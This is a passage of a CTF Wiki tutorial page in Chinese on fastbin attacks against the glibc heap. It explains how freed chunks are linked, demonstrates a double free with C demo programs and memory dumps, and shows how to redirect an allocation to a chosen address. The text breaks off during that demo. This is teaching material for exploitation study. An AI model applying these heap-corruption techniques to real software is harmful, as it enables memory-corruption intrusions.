class=md-nav aria-label=Firefox data-md-level=3> <label class=md-nav__title for=nav-9-7-2> <span class="md-nav__icon md-icon"></span> Firefox </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../browser/firefox/readme/ class=md-nav__link> Firefox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-7-3 type=checkbox id=nav-9-7-3> <label class=md-nav__link for=nav-9-7-3> Safari <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Safari data-md-level=3> <label class=md-nav__title for=nav-9-7-3> <span class="md-nav__icon md-icon"></span> Safari </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../browser/safari/readme/ class=md-nav__link> Safari </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8 type=checkbox id=nav-9-8> <label class=md-nav__link for=nav-9-8> Hardware <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Hardware data-md-level=2> <label class=md-nav__title for=nav-9-8> <span class="md-nav__icon md-icon"></span> Hardware </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1 type=checkbox id=nav-9-8-1> <label class=md-nav__link for=nav-9-8-1> CPU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=CPU data-md-level=3> <label class=md-nav__title for=nav-9-8-1> <span class="md-nav__icon md-icon"></span> CPU </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/cpu/readme/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-1-2 type=checkbox id=nav-9-8-1-2> <label class=md-nav__link for=nav-9-8-1-2> 侧信道攻击 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=侧信道攻击 data-md-level=4> <label class=md-nav__title for=nav-9-8-1-2> <span class="md-nav__icon md-icon"></span> 侧信道攻击 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/cpu/side-channel/prefetch/ class=md-nav__link> prefetch side-channel attack </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-8-2 type=checkbox id=nav-9-8-2> <label class=md-nav__link for=nav-9-8-2> 可信计算 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=可信计算 data-md-level=3> <label class=md-nav__title for=nav-9-8-2> <span class="md-nav__icon md-icon"></span> 可信计算 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../hardware/trusted-computing/tee/ class=md-nav__link> 可信执行环境 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10 type=checkbox id=nav-10> <label class=md-nav__link for=nav-10> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=nav-10> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_develop/basic_develop/ class=md-nav__link> Android 开发基础 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2 type=checkbox id=nav-10-2> <label class=md-nav__link for=nav-10-2> Android 运行机制简述 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 运行机制简述" data-md-level=2> <label class=md-nav__title for=nav-10-2> <span class="md-nav__icon md-icon"></span> Android 运行机制简述 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/readme/ class=md-nav__link> Android 应用运行机制简述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2 type=checkbox id=nav-10-2-2> <label class=md-nav__link for=nav-10-2-2> Android 中 Java 层的运行机制 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 中 Java 层的运行机制" data-md-level=3> <label class=md-nav__title for=nav-10-2-2> <span class="md-nav__icon md-icon"></span> Android 中 Java 层的运行机制 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/readme/ class=md-nav__link> Android 中 Java 层的运行机制 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/smali/smali/ class=md-nav__link> Smali </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-2-3 type=checkbox id=nav-10-2-2-3> <label class=md-nav__link for=nav-10-2-2-3> Dex && ODEX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Dex && ODEX" data-md-level=4> <label class=md-nav__title for=nav-10-2-2-3> <span class="md-nav__icon md-icon"></span> Dex && ODEX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/dex/dex/ class=md-nav__link> DEX文件 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/java_layer/dex/odex/ class=md-nav__link> ODEX文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-2-3 type=checkbox id=nav-10-2-3> <label class=md-nav__link for=nav-10-2-3> Android Native 层介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android Native 层介绍" data-md-level=3> <label class=md-nav__title for=nav-10-2-3> <span class="md-nav__icon md-icon"></span> Android Native 层介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_operating_mechanism/native_layer/so/ class=md-nav__link> so 介绍 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3 type=checkbox id=nav-10-3> <label class=md-nav__link for=nav-10-3> Android 逆向基本介绍 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 逆向基本介绍" data-md-level=2> <label class=md-nav__title for=nav-10-3> <span class="md-nav__icon md-icon"></span> Android 逆向基本介绍 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/overview/ class=md-nav__link> Android 逆向基本介绍 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/android_code_location/ class=md-nav__link> Android 关键代码定位 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-3 type=checkbox id=nav-10-3-3> <label class=md-nav__link for=nav-10-3-3> Android 简单静态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单静态分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-3> <span class="md-nav__icon md-icon"></span> Android 简单静态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/java-example/ class=md-nav__link> 静态分析 java 层例子 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/so-example/ class=md-nav__link> 静态分析原生层程序 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/static/complex-example/ class=md-nav__link> 静态分析综合题目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-10-3-4 type=checkbox id=nav-10-3-4> <label class=md-nav__link for=nav-10-3-4> Android 简单动态分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Android 简单动态分析" data-md-level=3> <label class=md-nav__title for=nav-10-3-4> <span class="md-nav__icon md-icon"></span> Android 简单动态分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/dynamic/dynamic_debug/ class=md-nav__link> Android 动态调试 </a> </li> <li class=md-nav__item> <a href=../../../../../../android/basic_reverse/dynamic/ida_native_debug/ class=md-nav__link> IDA 动态调试原生层程序 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-11 type=checkbox id=nav-11> <label class=md-nav__link for=nav-11> ICS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ICS data-md-level=1> <label class=md-nav__title for=nav-11> <span class="md-nav__icon md-icon"></span> ICS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../ics/ctfs/ class=md-nav__link> ICS_CTF 竞赛 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/discover/ class=md-nav__link> ICS_CTF 发现 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/exploit/ class=md-nav__link> ICS_CTF 利用 </a> </li> <li class=md-nav__item> <a href=../../../../../../ics/learn/ class=md-nav__link> ICS_CTF 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12 type=checkbox id=nav-12> <label class=md-nav__link for=nav-12> Blockchain <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Blockchain data-md-level=1> <label class=md-nav__title for=nav-12> <span class="md-nav__icon md-icon"></span> Blockchain </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/introduction/ class=md-nav__link> Blockchain Security Overview </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2 type=checkbox id=nav-12-2> <label class=md-nav__link for=nav-12-2> Ethereum Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Ethereum Security" data-md-level=2> <label class=md-nav__title for=nav-12-2> <span class="md-nav__icon md-icon"></span> Ethereum Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/introduction/ class=md-nav__link> Ethereum Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/basics/ class=md-nav__link> Ethereum Basics </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/selector-encoding/ class=md-nav__link> Function Selector and Argument Encoding </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/storage/ class=md-nav__link> Ethereum Storage </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/opcodes/ class=md-nav__link> Ethereum Opcodes </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-2-6 type=checkbox id=nav-12-2-6> <label class=md-nav__link for=nav-12-2-6> Known Attacks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Known Attacks" data-md-level=3> <label class=md-nav__title for=nav-12-2-6> <span class="md-nav__icon md-icon"></span> Known Attacks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/introduction/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/re-entrancy/ class=md-nav__link> Re-Entrancy </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/overflow-underflow/ class=md-nav__link> Integer Overflow and Underflow </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/randomness/ class=md-nav__link> Randomness </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/airdrop-hunting/ class=md-nav__link> Airdrop Hunting </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/shortaddress/ class=md-nav__link> Short Address Attack </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/delegatecall/ class=md-nav__link> Delegatecall </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/uninitialized-storage-pointer/ class=md-nav__link> Uninitialized Storage Pointer </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/arbitrarywrite/ class=md-nav__link> Arbitrary Writing </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/create2/ class=md-nav__link> CREATE2 </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/attacks/jump-oriented-programming/ class=md-nav__link> Jump Oriented Programming </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/reverse/ class=md-nav__link> Smart Contract Reverse </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/ethereum/resources/ class=md-nav__link> 学习资源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-12-3 type=checkbox id=nav-12-3> <label class=md-nav__link for=nav-12-3> Public Blockchain Security <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Public Blockchain Security" data-md-level=2> <label class=md-nav__title for=nav-12-3> <span class="md-nav__icon md-icon"></span> Public Blockchain Security </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../blockchain/publicblockchain/introduction/ class=md-nav__link> Public Blockchain Security Overview </a> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/publicblockchain/weaknesses/ class=md-nav__link> Blockchain Weaknesses </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../blockchain/challenges/ class=md-nav__link> Blockchain Security Challenges </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 原理 </a> </li> <li class=md-nav__item> <a href=#fastbin-double-free class=md-nav__link> Fastbin Double Free </a> <nav class=md-nav aria-label="Fastbin Double Free"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#house-of-spirit class=md-nav__link> House Of Spirit </a> <nav class=md-nav aria-label="House Of Spirit"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#alloc-to-stack class=md-nav__link> Alloc to Stack </a> <nav class=md-nav aria-label="Alloc to Stack"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arbitrary-alloc class=md-nav__link> Arbitrary Alloc </a> <nav class=md-nav aria-label="Arbitrary Alloc"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2014-hacklu-oreo class=md-nav__link> 2014 hack.lu oreo </a> <nav class=md-nav aria-label="2014 hack.lu oreo"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 基本分析 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-9447-ctf-search-engine class=md-nav__link> 2015 9447 CTF : Search Engine </a> <nav class=md-nav aria-label="2015 9447 CTF : Search Engine"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 词语结构体 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 堆内存相关操作 </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 漏洞 </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> 利用 </a> <nav class=md-nav aria-label=利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_24 class=md-nav__link> 利用思路 </a> </li> <li class=md-nav__item> <a href=#libc class=md-nav__link> 泄漏 libc 地址 </a> </li> <li class=md-nav__item> <a href=#fastbin class=md-nav__link> 构造 fastbin 循环链表 </a> </li> <li class=md-nav__item> <a href=#malloc_hook-chunk class=md-nav__link> 分配 malloc_hook 附近chunk </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> shell </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2017-0ctf-babyheap class=md-nav__link> 2017 0ctf babyheap </a> <nav class=md-nav aria-label="2017 0ctf babyheap"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_25 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 利用思路 </a> <nav class=md-nav aria-label=利用思路> <ul class=md-nav__list> <li class=md-nav__item> <a href=#libc_1 class=md-nav__link> 泄漏 libc 基地址 </a> </li> <li class=md-nav__item> <a href=#chunkmalloc_hook class=md-nav__link> 分配chunk到malloc_hook附近 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 题目 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 参考文献 </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content> <article class="md-content__inner md-typeset"> <a href=https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack.md title="Edit this page" class="md-content__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg> </a> <h1 id=fastbin-attack>Fastbin Attack<a class=headerlink href=#fastbin-attack title="Permanent link">&para;</a></h1> <div class="admonition warning"> <p class=admonition-title>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through Google Translate.</p> <p>Besides, you can also help to translate it: <a href=https://ctf-wiki.org/en/contribute/before-contributing/ >Contributing</a>.</p> </div> <h2 id=_1>介绍<a class=headerlink href=#_1 title="Permanent link">&para;</a></h2> <p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p> <ul> <li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li> <li>漏洞发生于 fastbin 类型的 chunk 中</li> </ul> <p>如果细分的话，可以做如下的分类：</p> <ul> <li>Fastbin Double Free</li> <li>House of Spirit</li> <li>Alloc to Stack</li> <li>Arbitrary Alloc</li> </ul> <p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p> <h2 id=_2>原理<a class=headerlink href=#_2 title="Permanent link">&para;</a></h2> <p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。 <div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //进行释放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
</code></pre></div> 释放前 <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000000000  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div> 执行三次 free 进行释放后 <div class=highlight><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000602000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000602040  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div> 此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1构成了一个单链表 <div class=highlight><pre><span></span><code>Fastbins[idx=2, size=0x30,ptr=0x602080]
===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
</code></pre></div></p> <h2 id=fastbin-double-free>Fastbin Double Free<a class=headerlink href=#fastbin-double-free title="Permanent link">&para;</a></h2> <h3 id=_3>介绍<a class=headerlink href=#_3 title="Permanent link">&para;</a></h3> <p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p> <p>Fastbin Double Free 能够成功利用主要有两部分的原因</p> <ol> <li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li> <li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li> </ol> <div class=highlight><pre><span></span><code>/* Another simple check: make sure the top of the bin is not the
       record we are going to add (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = &quot;double free or corruption (fasttop)&quot;;
        goto errout;
}
</code></pre></div> <h3 id=_4>演示<a class=headerlink href=#_4 title="Permanent link">&para;</a></h3> <p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p> <p><div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
</code></pre></div> 如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。 <div class=highlight><pre><span></span><code>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</code></pre></div> 如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。 <div class=highlight><pre><span></span><code>int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
</code></pre></div> 第一次释放<code>free(chunk1)</code></p> <p><img alt src=../figure/fastbin_free_chunk1.png></p> <p>第二次释放<code>free(chunk2)</code></p> <p><img alt src=../figure/fastbin_free_chunk2.png></p> <p>第三次释放<code>free(chunk1)</code></p> <p><img alt src=../figure/fastbin_free_chunk3.png></p> <p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p> <p><div class=highlight><pre><span></span><code>typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&amp;bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf(&quot;%p&quot;,chunk_b);
    return 0;
}
</code></pre></div> 在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于bss段中正是我们之前设置的<code>CHUNK bss_chunk</code> <div class=highlight><pre><span></span><code>Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
